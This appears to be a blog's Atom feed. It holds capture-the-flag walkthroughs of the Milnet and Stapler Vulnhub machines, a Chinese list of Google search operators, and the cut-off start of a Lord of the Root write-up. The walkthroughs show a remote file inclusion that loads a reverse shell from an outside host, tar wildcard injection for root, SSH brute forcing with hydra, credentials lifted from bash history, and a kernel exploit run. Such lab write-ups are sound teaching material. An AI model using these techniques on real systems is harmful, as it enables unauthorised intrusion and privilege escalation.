<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[tick.Tack]]></title>
  <link href="http://newdominic.github.io/atom.xml" rel="self"/>
  <link href="http://newdominic.github.io/"/>
  <updated>2016-06-19T11:59:43+08:00</updated>
  <id>http://newdominic.github.io/</id>
  <author>
    <name><![CDATA[DMC]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Milnet: 1]]></title>
    <link href="http://newdominic.github.io/blog/2016/06/18/Milnet_1/"/>
    <updated>2016-06-18T18:00:45+08:00</updated>
    <id>http://newdominic.github.io/blog/2016/06/18/Milnet_1</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/milnet-1,148/">Milnet: 1</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>

<!--more-->


<hr />

<p>Nmap scan result:</p>

<pre><code>Nmap scan report for 192.168.0.109
Host is up, received arp-response (0.00048s latency).
Scanned at 2016-06-17 22:09:01 CST for 36s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:E7:D8:D2 (VMware)
</code></pre>

<h2>Limited Shell</h2>

<p>This machine is running a simple http server on port 80. These files were found after scanning with dirbuster:</p>

<pre><code>File found: /index.php - 200
File found: /content.php - 200
File found: /main.php - 200
File found: /info.php - 200
File found: /bomb.php - 200
File found: /props.php - 200
File found: /info.php - 200
</code></pre>

<p>Except the <strong>info.php</strong> showed the result of phpinfo(), there is nothing useful in other pages. But something caught my eye. When I was browsing <strong>content.php</strong>, the result is same as <strong>main.php</strong>. So I decided to examine deeper with burpsuite.</p>

<pre><code>POST /content.php HTTP/1.1
Host: 192.168.0.109
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.0.109/nav.php
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

route=main
</code></pre>

<p>When I clicked on the &lsquo;Main&rsquo; button, it was trigged to POST to <strong>content.php</strong> with a parameter <strong>route=main</strong>. And so do the &lsquo;Bomb&rsquo; and the &lsquo;Props&rsquo; buttons.</p>

<p>It seems to be a chance of File Inclusion vulnerability. First I made some attempts for Local File Inclusion. It is okay to use the relative path traversal to get to the file like: <strong>route=../../../../../var/www/html/main</strong>. But all I can do is to include files with <strong>.php</strong> extension. Putting a &lsquo;%00&rsquo; at the end did not help.</p>

<p>Next I tried to include a reverse shell from my machine.</p>

<pre><code>POST /content.php HTTP/1.1
Host: 192.168.0.109
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.0.109/nav.php
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

route=http://192.168.0.105/php-reverse-shell.txt?
</code></pre>

<p>The <strong>.php</strong> problem can be bypassed by putting a &lsquo;?&rsquo; at the end of the line. And this time I got a shell back on my machine.</p>

<pre><code># nc -lvp 6666
listening on [any] 6666 ...
192.168.0.109: inverse host lookup failed: Unknown host
connect to [192.168.0.105] from (UNKNOWN) [192.168.0.109] 50118
Linux seckenheim.net.mil 4.4.0-22-generic #40-Ubuntu SMP Thu May 12 22:03:46 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 16:42:41 up  6:39,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
</code></pre>

<h2>Privilege Escalation</h2>

<p>After doing some enumeration, I found a suspicious cron job in <strong>/etc/crontab</strong>.</p>

<pre><code>$ cat /etc/crontab
---snip---
# m h dom mon dow user  command
*/1 *   * * *   root    /backup/backup.sh
---snip---
</code></pre>

<p>And here&rsquo;s what <strong>backup.sh</strong> does:</p>

<pre><code>#!/bin/bash
cd /var/www/html
tar cf /backup/backup.tgz *
</code></pre>

<p>It uses the <strong>tar</strong> command to compact the whole directory of <strong>/var/www/html/</strong> every minutes.</p>

<p>And here comes the wildcard exploit again. We have done this before while messing with <a href="../../../../2015/12/23/pipe">PIPE</a>. We can use the same technique to escalate to <strong>root</strong> privilege.</p>

<p>This time I&rsquo;ll use the <strong>php</strong> command to open another php reverse shell.</p>

<p>On milnet:</p>

<pre><code>$ cd /var/www/html
$ echo &gt; --checkpoint=1
$ echo &gt; --checkpoint-action=exec=sh\ shell.sh
$ wget http://192.168.0.105/php-reverse-shell.txt -O prs.php
--2016-06-18 18:12:37--  http://192.168.0.105/php-reverse-shell.txt
Connecting to 192.168.0.105:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5495 (5.4K) [text/plain]
Saving to: 'prs.php'

     0K .....                                                 100%  875M=0s

2016-06-18 18:12:37 (875 MB/s) - 'prs.php' saved [5495/5495]

$ sed -i s/6666/8888/g prs.php
$ echo 'php prs.php &amp;' &gt; shell.sh
$ chmod +x shell.sh
</code></pre>

<p>When the backup.sh is triggered, we&rsquo;ll get the shell pop with <strong>root</strong>.</p>

<pre><code>===
# nc -lvp 8888
listening on [any] 8888 ...
192.168.0.109: inverse host lookup failed: Unknown host
connect to [192.168.0.105] from (UNKNOWN) [192.168.0.109] 36284
Linux seckenheim.net.mil 4.4.0-22-generic #40-Ubuntu SMP Thu May 12 22:03:46 UTC                                                                                                                                                              2016 x86_64 x86_64 x86_64 GNU/Linux
 15:14:02 up  5:10,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# cat /root/credits.txt
        ,----,
      ,/   .`|
    ,`   .'  :  ,---,                          ,---,.
  ;    ;     /,--.' |                        ,'  .' |                  ,---,
.'___,/    ,' |  |  :                      ,---.'   |      ,---,     ,---.'|
|    :     |  :  :  :                      |   |   .'  ,-+-. /  |    |   | :
;    |.';  ;  :  |  |,--.   ,---.          :   :  |-, ,--.'|'   |    |   | |
`----'  |  |  |  :  '   |  /     \         :   |  ;/||   |  ,"' |  ,--.__| |
    '   :  ;  |  |   /' : /    /  |        |   :   .'|   | /  | | /   ,'   |
    |   |  '  '  :  | | |.    ' / |        |   |  |-,|   | |  | |.   '  /  |
    '   :  |  |  |  ' | :'   ;   /|        '   :  ;/||   | |  |/ '   ; |:  |
    ;   |.'   |  :  :_:,''   |  / |        |   |    \|   | |--'  |   | '/  '
    '---'     |  | ,'    |   :    |        |   :   .'|   |/      |   :    :|
              `--''       \   \  /         |   | ,'  '---'        \   \  /
                           `----'          `----'                  `----'


This was milnet for #vulnhub by @teh_warriar
I hope you enjoyed this vm!

If you liked it drop me a line on twitter or in #vulnhub.

I hope you found the clue:
/home/langman/SDINET/DefenseCode_Unix_WildCards_Gone_Wild.txt
I was sitting on the idea for using this technique for a BOOT2ROOT VM prives for                                                                                                                                                              a long time...

This VM was inspired by The Cuckoo's Egg.
If you have not read it give it a try:
http://www.amazon.com/Cuckoos-Egg-Tracking-Computer-Espionage/dp/1416507787/
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Stapler: 1]]></title>
    <link href="http://newdominic.github.io/blog/2016/06/17/stapler_1/"/>
    <updated>2016-06-17T12:22:45+08:00</updated>
    <id>http://newdominic.github.io/blog/2016/06/17/stapler_1</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/stapler-1,150/">Stapler: 1</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>

<!--more-->


<hr />

<p>Nmap scan result</p>

<pre><code>Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2016-06-17 12:29 CST
Warning: 192.168.0.108 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.0.108
Host is up (0.00035s latency).
Not shown: 992 filtered ports
PORT     STATE  SERVICE
20/tcp   closed ftp-data
21/tcp   open   ftp
22/tcp   open   ssh
53/tcp   open   domain
80/tcp   open   http
139/tcp  open   netbios-ssn
666/tcp  open   doom
3306/tcp open   mysql
MAC Address: 08:00:27:F5:FB:B3 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 8.43 seconds
</code></pre>

<p>The <a href="https://www.vulnhub.com/entry/stapler-1,150/#description">description</a> says that:</p>

<pre><code>There are multiple methods to-do this machine
At least two (2) paths to get a limited shell
At least three (3) ways to get a root access
</code></pre>

<h2>Limited shell 1</h2>

<p>I used enum4linux to test the 139 port, which gave me the users on this machine.</p>

<pre><code>...snip...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
...snip...
</code></pre>

<p>Then I compsed these names into a file, then tried to brute force with it for both user name and password on the ssh service.</p>

<pre><code># grep 'Unix User' e4l_result | cut -d'\' -f2 | cut -d' ' -f1 &gt; user_list
# hydra -L user_list -P user_list 192.168.0.108 ssh

Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-06-17 13:42:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
[DATA] max 16 tasks per 1 server, overall 64 tasks, 900 login tries (l:30/p:30), ~0 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 192.168.0.108   login: SHayslett   password: SHayslett
</code></pre>

<p>Here we got SHayslett who set the password the same as the username. Now we can login the ssh with this credential.</p>

<pre><code>ssh SHayslett@192.168.0.108
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
SHayslett@192.168.0.108's password:
Welcome back!


SHayslett@red:~$ id
uid=1005(SHayslett) gid=1005(SHayslett) groups=1005(SHayslett)
SHayslett@red:~$
</code></pre>

<h2>Privilege Escalation 1</h2>

<p>After logged in as SHayslett, I found it is available to browse every users&#8217; home directory.</p>

<pre><code>SHayslett@red:/home$ ls -al
total 128
drwxr-xr-x 32 root       root       4096 Jun  4 20:13 .
drwxr-xr-x 22 root       root       4096 Jun  7 09:08 ..
drwxr-xr-x  2 AParnell   AParnell   4096 Jun  5 18:21 AParnell
drwxr-xr-x  2 CCeaser    CCeaser    4096 Jun  5 18:26 CCeaser
drwxr-xr-x  2 CJoo       CJoo       4096 Jun  5 18:24 CJoo
drwxr-xr-x  2 Drew       Drew       4096 Jun  5 18:24 Drew
drwxr-xr-x  2 DSwanger   DSwanger   4096 Jun  5 18:24 DSwanger
drwxr-xr-x  2 Eeth       Eeth       4096 Jun  5 18:24 Eeth
drwxr-xr-x  2 elly       elly       4096 Jun  5 18:24 elly
drwxr-xr-x  2 ETollefson ETollefson 4096 Jun  5 18:24 ETollefson
drwxr-xr-x  2 IChadwick  IChadwick  4096 Jun  5 18:24 IChadwick
drwxr-xr-x  2 jamie      jamie      4096 Jun  5 18:26 jamie
drwxr-xr-x  2 JBare      JBare      4096 Jun  5 18:24 JBare
drwxr-xr-x  2 jess       jess       4096 Jun  5 18:24 jess
drwxr-xr-x  2 JKanode    JKanode    4096 Jun  5 18:25 JKanode
drwxr-xr-x  2 JLipps     JLipps     4096 Jun  5 18:26 JLipps
drwxr-xr-x  2 kai        kai        4096 Jun  5 18:24 kai
drwxr-xr-x  2 LSolum     LSolum     4096 Jun  5 18:24 LSolum
drwxr-xr-x  2 LSolum2    LSolum2    4096 Jun  5 18:26 LSolum2
drwxr-xr-x  2 MBassin    MBassin    4096 Jun  5 18:24 MBassin
drwxr-xr-x  2 mel        mel        4096 Jun  5 18:24 mel
drwxr-xr-x  2 MFrei      MFrei      4096 Jun  5 18:24 MFrei
drwxr-xr-x  2 NATHAN     NATHAN     4096 Jun  5 18:24 NATHAN
drwxr-xr-x  3 peter      peter      4096 Jun  3 16:11 peter
drwxr-xr-x  2 RNunemaker RNunemaker 4096 Jun  5 18:24 RNunemaker
drwxr-xr-x  2 Sam        Sam        4096 Jun  5 18:24 Sam
drwxr-xr-x  2 SHAY       SHAY       4096 Jun  5 18:24 SHAY
drwxr-xr-x  3 SHayslett  SHayslett  4096 Jun 17 13:04 SHayslett
drwxr-xr-x  2 SStroud    SStroud    4096 Jun  5 18:24 SStroud
drwxr-xr-x  2 Taylor     Taylor     4096 Jun  5 18:26 Taylor
drwxrwxrwx  2 www        www        4096 Jun  5 18:25 www
drwxr-xr-x  2 zoe        zoe        4096 Jun  5 18:26 zoe
SHayslett@red:/home$
</code></pre>

<p>Let&rsquo;s check if there&rsquo;s any interesting stuff in them.</p>

<pre><code>SHayslett@red:/home$ ls -alR | grep -v .bash_logout | grep -v .bashrc |grep -v .profile
...snip...
./JKanode:
total 24
drwxr-xr-x  2 JKanode JKanode 4096 Jun  5 18:25 .
drwxr-xr-x 32 root    root    4096 Jun  4 20:13 ..
-rw-r--r--  1 JKanode JKanode  167 Jun  5 18:25 .bash_history
...snip...
</code></pre>

<p>We found something different in JKanode&rsquo;s and peter&rsquo;s home directory.</p>

<p>Now take a look at the .bash_history in JKanode</p>

<pre><code>SHayslett@red:/home/JKanode$ cat .bash_history
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
top
kill -9 3747
exit
SHayslett@red:/home/JKanode$
</code></pre>

<p>Looks like we have peter&rsquo;s password here. Now it&rsquo;s time to switch to peter&rsquo;s account.</p>

<p>(Not sure if this is the second way to get the limited shell)</p>

<pre><code>SHayslett@red:/home/JKanode$ ssh peter@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:WuY26BwbaoIOawwEIZRaZGve4JZFaRo7iSvLNoCwyfA.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
peter@localhost's password:
Welcome back!
This is the Z Shell configuration function for new users,
zsh-newuser-install.
You are seeing this message because you have no zsh startup files
(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
~).  This function can help you with a few settings that should
make your use of the shell easier.

You can:

(q)  Quit and do nothing.  The function will be run again next time.

(0)  Exit, creating the file ~/.zshrc containing just a comment.
     That will prevent this function being run again.

(1)  Continue to the main menu.

(2)  Populate your ~/.zshrc with the configuration recommended
     by the system administrator and exit (you will need to edit
     the file by hand, if so desired).

--- Type one of the keys in parentheses ---q
%red id
uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
red%
</code></pre>

<p>Now we are logged in as peter. And let&rsquo;s check the home directory first.</p>

<pre><code>red% ls -al
total 72
drwxr-xr-x  3 peter peter  4096 Jun  3 16:11 .
drwxr-xr-x 32 root  root   4096 Jun  4 20:13 ..
-rw-------  1 peter peter     1 Jun  5 18:00 .bash_history
-rw-r--r--  1 peter peter   220 Jun  3 13:53 .bash_logout
-rw-r--r--  1 peter peter  3771 Jun  3 13:53 .bashrc
drwx------  2 peter peter  4096 Jun  6 23:17 .cache
-rw-r--r--  1 peter peter   675 Jun  3 13:53 .profile
-rw-r--r--  1 peter peter     0 Jun  3 13:55 .sudo_as_admin_successful
-rw-------  1 peter peter   577 Jun  3 14:11 .viminfo
-rw-rw-r--  1 peter peter 39206 Jun  3 16:11 .zcompdump
</code></pre>

<p>&lsquo;.sudo_as_admin_successful&rsquo;</p>

<p>Looks like peter had sudo access before. Let&rsquo;s give it a try.</p>

<pre><code>red% sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter:
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
</code></pre>

<p>It seems that peter is granted access to all commands. Now we can logged in as root simply and get the flag!</p>

<pre><code>red% sudo su
➜  peter id
uid=0(root) gid=0(root) groups=0(root)
➜  peter cat /root/flag.txt
~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
</code></pre>

<h2>Privilege Escalation 2</h2>

<p>Here&rsquo;s the system information.</p>

<pre><code>red% uname -a
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
red% cat /etc/os-release
NAME="Ubuntu"
VERSION="16.04 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
UBUNTU_CODENAME=xenial
</code></pre>

<p>It can be easily pwnd with the <a href="https://www.exploit-db.com/exploits/39772/">exploit</a> found on exploit-db.</p>

<pre><code>red% ./compile.sh
doubleput.c: In function ‘make_setuid’:
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
red% ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in &lt;=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@red:~/ebpf_mapfd_doubleput_exploit# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare),1000(peter)
root@red:~/ebpf_mapfd_doubleput_exploit# cat /root/flag.txt
~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
</code></pre>

<h2>Ongoing Attempts</h2>

<p><strong>Port 666</strong></p>

<p>After connecting to port 666 with nc, it response with a stream of data then closed the connection.</p>

<p>I tried to direct the stream to a output file. It turns out that it is a zip file, which contains a image call message2.jpg.</p>

<pre><code># nc 192.168.0.108 666 &gt; output
# file output
output: Zip archive data, at least v2.0 to extract
# unzip output
Archive:  output
  inflating: message2.jpg
</code></pre>

<p><img class="center" src="http://newdominic.github.io/images/2016-06-17-stapler_1/message2.jpg"></p>

<p>Then I got a cookie by searching strings in it&hellip;.</p>

<pre><code># strings message2.jpg
JFIF
vPhotoshop 3.0
8BIM
1If you are reading this, you should get a cookie!
---snip---
</code></pre>

<hr />

<p><strong>Port 80</strong></p>

<p>The web sever is setup by using the php command directly.</p>

<pre><code>red% ps aux
---snip--- 
root      1409  0.0  0.2   6472  3060 ?        S    11:07   0:00 su -c authbind php -S 0.0.0.0:80 -t /home/www/ &amp;&gt;/dev/null www
---snip---
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Google Adavanced Search Operators]]></title>
    <link href="http://newdominic.github.io/blog/2016/05/03/google_advanced_search_operators/"/>
    <updated>2016-05-03T09:51:45+08:00</updated>
    <id>http://newdominic.github.io/blog/2016/05/03/google_advanced_search_operators</id>
    <content type="html"><![CDATA[<!--more-->


<p><strong>allinanchor:</strong> 查詢文字須全部在鏈結用的文字內出現；不可與其他operator同時使用。</p>

<p><strong>allintext:</strong> 查詢文字須全部在頁面內出現。</p>

<p><strong>allintitle:</strong> 一般搜尋時，查詢文字須全部在頁面的標題內出現；圖像搜尋時，查詢文字須全部在圖像檔名裡出現；Google News搜尋時，查詢文字須全部在文章標題內出現。</p>

<p><strong>allinurl:</strong> 一般搜尋時，查詢文字須全部在URL內出現；Google News搜尋時，功能同allintitle:。</p>

<p><strong>author:</strong> Google Groups限定，針對作者名稱搜尋。</p>

<p><strong>cache:</strong> cache:URL；取得頁面的快取版本。</p>

<p><strong>define:</strong> 查詢字、詞、片語定義。</p>

<p><strong>ext:</strong> 同filetype:。</p>

<p><strong>filetype:</strong> 針對副檔名搜尋。</p>

<p><strong>group:</strong> Google Groups限定，針對群組名稱搜尋相關文章。</p>

<p><strong>id:</strong> 同info:。</p>

<p><strong>inanchor:</strong> 查詢文字須在鏈結用的文字內出現。</p>

<p><strong>info:</strong> info:URL；顯示該URL相關資訊。</p>

<p><strong>insubject:</strong> Google Groups限定，針對標題搜尋相關文章。</p>

<p><strong>intext:</strong> intext:term；查詢文字須在頁面內出現。</p>

<p><strong>intitle:</strong> 查詢文字須在頁面的標題內出現。</p>

<p><strong>inurl:</strong> 查詢文字須在URL內出現。</p>

<p><strong>link:</strong> link:URL；搜尋有鏈結指向URL的頁面。</p>

<p><strong>location:</strong> Google News限定，針對地區搜尋相關文章。</p>

<p><strong>movie:</strong> 查詢電影資訊。</p>

<p><strong>related:</strong> relader:URL；查詢類似於URL的頁面。</p>

<p><strong>site:</strong> 針對特定網域搜尋。</p>

<p><strong>source:</strong> Google News限定，針對新聞來源搜尋相關文章。</p>

<p><strong>weather</strong> 查詢天氣狀況。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Lord of the Root]]></title>
    <link href="http://newdominic.github.io/blog/2015/12/26/lord_of_root/"/>
    <updated>2015-12-26T21:38:42+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/12/26/lord_of_root</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">Lord Of The Root</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>

<!--more-->


<hr />

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root# nmap -p- -T5 192.168.0.119

Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2015-12-26 08:30 EST
Nmap scan report <span class="k">for</span> 192.168.0.119
Host is up <span class="o">(</span>0.00068s latency<span class="o">)</span>.
Not shown: <span class="m">65534</span> filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:0C:29:FA:7B:62 <span class="o">(</span>VMware<span class="o">)</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 53.53 seconds</code></pre></div>


<p>nmap掃瞄過之後只有port 22是打開的，另外掃過UDP也沒有掃到開起的port</p>

<p>最後只好先連上port 22看看</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root# ssh 192.168.0.119

                                                  .____    _____________________________
                                                  <span class="p">|</span>    <span class="p">|</span>   <span class="se">\_</span>____  <span class="se">\_</span>_    ___/<span class="se">\_</span>_____   <span class="se">\</span>
                                                  <span class="p">|</span>    <span class="p">|</span>    /   <span class="p">|</span>   <span class="se">\|</span>    <span class="p">|</span>    <span class="p">|</span>       _/
                                                  <span class="p">|</span>    <span class="p">|</span>___/    <span class="p">|</span>    <span class="se">\ </span>   <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>   <span class="se">\</span>
                                                  <span class="p">|</span>_______ <span class="se">\_</span>______  /____<span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span>_  /
                                                          <span class="se">\/</span>       <span class="se">\/</span>                 <span class="se">\/</span>
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
<span class="p">|</span>    <span class="p">|</span>/ _<span class="p">|</span> ____   ____   ____ <span class="p">|</span>  <span class="p">|</span> __ <span class="se">\_</span>   _____/______<span class="p">|</span>__<span class="p">|</span> ____   ____    __<span class="p">|</span> _/ <span class="se">\_</span>_    ___/___   <span class="se">\_</span>   _____/ _____/  <span class="p">|</span>_  ___________
<span class="p">|</span>      &lt;  /    <span class="se">\ </span>/  _ <span class="se">\_</span>/ ___<span class="se">\|</span>  <span class="p">|</span>/ /  <span class="p">|</span>    __<span class="o">)</span> <span class="se">\_</span>  __ <span class="se">\ </span> <span class="p">|</span>/ __ <span class="se">\ </span>/    <span class="se">\ </span> / __ <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span> /  _ <span class="se">\ </span>  <span class="p">|</span>    __<span class="o">)</span>_ /    <span class="se">\ </span>  __<span class="se">\/</span> __ <span class="se">\_</span>  __ <span class="se">\</span>
<span class="p">|</span>    <span class="p">|</span>  <span class="se">\|</span>   <span class="p">|</span>  <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="se">\_</span>__<span class="p">|</span>    &lt;   <span class="p">|</span>     <span class="se">\ </span>  <span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>  <span class="se">\ </span> ___/<span class="p">|</span>   <span class="p">|</span>  <span class="se">\/</span> /_/ <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span><span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="p">|</span>        <span class="se">\ </span>  <span class="p">|</span>  <span class="se">\ </span> <span class="p">|</span> <span class="se">\ </span> ___/<span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>
<span class="p">|</span>____<span class="p">|</span>__ <span class="se">\_</span>__<span class="p">|</span>  /<span class="se">\_</span>___/ <span class="se">\_</span>__  &gt;__<span class="p">|</span>_ <span class="se">\ </span> <span class="se">\_</span>__  /   <span class="p">|</span>__<span class="p">|</span>  <span class="p">|</span>__<span class="p">|</span><span class="se">\_</span>__  &gt;___<span class="p">|</span>  /<span class="se">\_</span>___ <span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span> <span class="se">\_</span>___/  /_______  /___<span class="p">|</span>  /__<span class="p">|</span>  <span class="se">\_</span>__  &gt;__<span class="p">|</span>
        <span class="se">\/</span>    <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>                  <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>                           <span class="se">\/</span>     <span class="se">\/</span>          <span class="se">\/</span>
Easy as 1,2,3</code></pre></div>


<p>&ldquo;Knock Friend To Enter&rdquo; 看來第一關是<a href="https://en.wikipedia.org/wiki/Port_knocking">port knocking</a></p>

<p>敲完門之後，nmap再掃一次就多了一個新的port</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">1337/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span></code></pre></div>


<p>連上網站後，只有三張魔戒的meme</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-26-lord_of_the_root/iwilldoit.jpg"></p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-26-lord_of_the_root/hipster.jpg"></p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-26-lord_of_the_root/legolas.jpg"></p>

<p>抓下來細看一下，裡面好像沒有藏甚麼資訊</p>

<p>接著想看一下robots.txt有沒有擋調特別的路徑，卻出現了下面的特出景象</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-26-lord_of_the_root/robots.png"></p>

<p>而且原始碼內還有一個神祕的字串</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;html&gt;
